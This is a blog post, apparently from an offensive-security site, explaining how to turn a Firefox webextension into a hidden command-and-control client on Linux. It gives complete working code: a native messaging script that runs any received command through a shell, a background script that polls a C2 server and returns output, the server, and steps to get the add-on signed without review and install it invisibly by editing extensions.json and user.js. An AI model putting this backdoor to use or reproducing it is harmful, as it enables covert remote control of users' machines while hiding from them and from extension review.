---
layout: post
title: Using Firefox webextensions as c2 client
description: A post to teach how to use webextensions on Firefox to interact with our c&c server
keywords: payload,shell,c2
disqus: true
tags: [TRICKS]
categories: Persistence
---
#### ATTENTION
This technique was tested only on Linux, it'll not work on Mac or Windows.

#### Firefox Webextensions
Firefox webextension is the new name for plugins, basically you write code in JavaScript that has the capability of interacting with your browser's API. So based on this, I came up with the idea of creating a webextension to act like a command and control client.

##### How to do that
After a few minutes digging  the Firefox webextensions documentation, I found a functionality called [Native Messaging](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/Native_messaging), that basically create a tunnel between a webextensions and a system program, if you want more details on this I suggest to you to read the documentation as this is not the focus of this article.

##### Creating a Native Messaging app
Basically we need 2 files in order to do that, a manifest and the application to receive commands from the webextensions, you can find an example of both on the documentation :
- [Manifest](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/Native_messaging#App_manifest)
- [Application](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/Native_messaging#App_side)

##### Manifest
This file indicates to Firefox that there's a new function that can be used by an allowed webextension
```json
{
  "name": "execution",
  "description": "Malicious function",
  "path": "/home/user/.mozilla/extensions/payload.py",
  "type": "stdio",
  "allowed_extensions": [ "malicious-webextension@github.io" ]
}
```
The attribute `name` will be used by Firefox to bind a function with this name, and the `allowed_extensions` will be used to permit only our extension to use that function (we are going to set this value `malicious-webextension@github.io` on the webextension manifest), and the attribute path define where the app script is located.

Then copy this file to `/home/user/.mozilla/native-messaging-hosts/execution.json`

##### App script
This is a python script, which receives data from the webextension via STDIN to execute the value as a system command encode the response and send the it via STDOUT to the webextension.
```python
#!/usr/bin/env python

import sys
import json
import struct
import base64
import subprocess

def getMessage():
    rawLength = sys.stdin.buffer.read(4)
    if len(rawLength) == 0:
        sys.exit(0)
    messageLength = struct.unpack('@I', rawLength)[0]
    message = sys.stdin.buffer.read(messageLength).decode('utf-8')
    return json.loads(message)

def encodeMessage(messageContent):
    encodedContent = json.dumps(messageContent).encode('utf-8')
    encodedLength = struct.pack('@I', len(encodedContent))
    return {'length': encodedLength, 'content': encodedContent}

def sendMessage(encodedMessage):
    sys.stdout.buffer.write(encodedMessage['length'])
    sys.stdout.buffer.write(encodedMessage['content'])
    sys.stdout.buffer.flush()

def execcmd(cmd):
    output = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE,universal_newlines=True)
    return base64.b64encode(output.stdout.encode()).decode()

while True:
    receivedMessage = getMessage()
    sendMessage(encodeMessage(execcmd(receivedMessage)))
```
Now everything is set up. So the webextension can interact with the `execution` function.

##### Creating a Webextension
We need to create only two files, a `manifest.json` which contains the webextensions informations and the `background.js` which contains the client logic. Here we will create a simple example but feel free to create more sophisticated clients. First let's create the manifest file:
```json
{
  "description": "C2 Client",
  "manifest_version": 2,
  "name": "C2 Client",
  "version": "1.0",
  "applications": {
    "gecko": {
      "id": "malicious-webextension@github.io",
      "strict_min_version": "50.0"
    }
  },
  "background": {
    "scripts": ["background.js"]
  },
  "permissions": ["nativeMessaging","<all_urls>"]
}
```
I'll not explain all the parameters, but the most important here is the value inside `.application | .gecko | .id`. This value contains the same id that was set on the native messaging app, and the value `nativeMessaging` inside the attribute `permissions`, which specifies to Firefox that the webextension has the ability to use Native Messaging Apps. 

Now let's create a webexntesion to interact with our c2 server.
```javascript
var port;
var timeout = 1000;
var result = "none";

var sendMessage = function(){
  server = "http://127.0.0.1:8081/";
  var oReq = new XMLHttpRequest();
  oReq.open('POST',server,true)
  oReq.setRequestHeader('Content-type', 'application/x-www-form-urlencoded')

  oReq.onerror = function (e) {
    setTimeout(sendMessage,timeout); }

  oReq.ontimeout = function (e) {
    setTimeout(sendMessage,timeout);
  }

  oReq.onload = function(oEvent) {
    if (oReq.status == 200){
      var cmd = oReq.response
      if (cmd != ""){
        console.log(cmd)
        port = browser.runtime.connectNative("execution");
        port.onMessage.addListener((response) => {
          result = response;
          port.disconnect();
        });
        port.postMessage(cmd);
      }
      setTimeout(sendMessage,timeout);
    }
  };
  oReq.send("response="+result);
  result = "none"
}
setTimeout(sendMessage,timeout);
```
Basically this javascript code connects to the c2 server, waits for a command, then it executes after the command is received.
And the server side is just a simple http server written in python.
```python
import cgi
import threading
from urlparse import urlparse, parse_qs
from SocketServer import ThreadingMixIn
from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler

class Handler(BaseHTTPRequestHandler):

    def do_POST(self):
        self.send_response(200)
        self.end_headers()
        message =  threading.currentThread().getName()
        form = cgi.FieldStorage(fp=self.rfile,headers=self.headers,environ={'REQUEST_METHOD': 'POST'})
        result = form.getvalue("response")
        if result != "none":
            print(result.decode('base64'))
            return 
        cmd = raw_input("$ ")
        self.wfile.write(cmd)
        return
 
    def log_message(self, format, *args):
        return

class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    """Handle requests in a separate thread."""

if __name__ == '__main__':
    server = ThreadedHTTPServer(('localhost', 8081), Handler)
    print 'Starting server, use <Ctrl-C> to stop'
    server.serve_forever()
```
##### Generating the webextension
Now we compress  the files `manifest.json` and `background.js` as `malicious-webextension@github.io.xpi` using `zip`, then we go to [mozilla developer dashboard](https://addons.mozilla.org/en-US/developers/addon/submit/distribution) to sign our webextension.
Select the option ` On your own. Your submission will be immediately signed for self-distribution. Updates should be handled by you via an updateURL or external application updates.` upload our .xpi file, click in `Sign Add-on`, then select the option no, because we don't want Mozilla to analyse our code, click in continue, and then download the signed webextension.

#### Installing the webextension
Now to install our webextension we're not going to use the Firefox interface (because it requires user interaction). We'll edit a couple files to make Firefox detect our webextension.

##### webextension file
Copy the signed webextension file to `$HOME/.mozilla/firefox/profile-name/extensions`

##### extensions.json
The file `$HOME/.mozilla/firefox/profile-name/extensions.json`, is where Firefox saves what webextensions are installed, then we just need to put our webextension in this file, here's an example of the configuration.
```json
{
  "id": "malicious-webextension@github.io",
  "syncGUID": "{7b594760-d78d-410c-ad1f-34a4aaa8c3ac}",
  "version": "1.0",
  "type": "extension",
  "loader": null,
  "updateURL": null,
  "optionsURL": null,
  "optionsType": null,
  "optionsBrowserStyle": true,
  "aboutURL": null,
  "defaultLocale": {
    "name": "C2 Client",
    "description": "C2 Client",
    "creator": null,
    "developers": null,
    "translators": null,
    "contributors": null
  },
  "visible": true,
  "active": true,
  "userDisabled": false,
  "appDisabled": false,
  "installDate": 1550640880000,
  "updateDate": 1550640880000,
  "applyBackgroundUpdates": 1,
  "path": "/home/user/.mozilla/firefox/f22lasdy.default/extensions/malicious-webextension@github.io",
  "skinnable": false,
  "sourceURI": null,
  "releaseNotesURI": null,
  "softDisabled": false,
  "foreignInstall": false,
  "strictCompatibility": true,
  "locales": [],
  "targetApplications": [
    {
      "id": "toolkit@mozilla.org",
      "minVersion": "50.0",
      "maxVersion": null
    }
  ],
  "targetPlatforms": [],
  "signedState": 2,
  "seen": true,
  "dependencies": [],
  "userPermissions": {
    "permissions": [
      "nativeMessaging"
    ],
    "origins": [
      "<all_urls>"
    ]
  },
  "icons": {},
  "iconURL": null,
  "blocklistState": 0,
  "blocklistURL": null,
  "startupData": null,
  "hidden": true,
  "installTelemetryInfo": {
    "source": "about:addons",
    "method": "install-from-file"
  },
  "location": "app-system-defaults"
}
```

And here we have a really nice option called `location`, and it's nice because if we set the value to `app-system-defaults` then the webextension will not be visible on Firefox.
To automate the process of infecting this file we can use this python script:
```python
import json
extensions = json.loads(open('/home/user/.mozilla/firefox/profile-name/extensions.json').read())
plugin = json.loads(open('myexntension.json').read())
plugin['path'] = '/home/user/.mozilla/firefox/profile-name/extensions/malicious-webextension@github.io.xpi'
extensions['addons'].insert(len(extensions['addons']),plugin)
print(json.dumps(extensions))"
```
Then we replace the contents of `extensions.json` with the python script output.

##### user.js
Lastly, we create the file `/home/user/.mozilla/firefox/profile-name/user.js` with the following contents:
```
user_pref("extensions.webextensions.uuids","{\"malicious-webextension@github.io\":\"fef0c3b3-9327-4584-839c-52cf45d94170\"}");
```

#### PoC
Here's a video showing the webextension in usage. I'm using the webextension as a developer extension to show the debug console.
[![PoC video](http://img.youtube.com/vi/_cGhsWiq7Rg/0.jpg)](http://www.youtube.com/watch?v=_cGhsWiq7Rg)
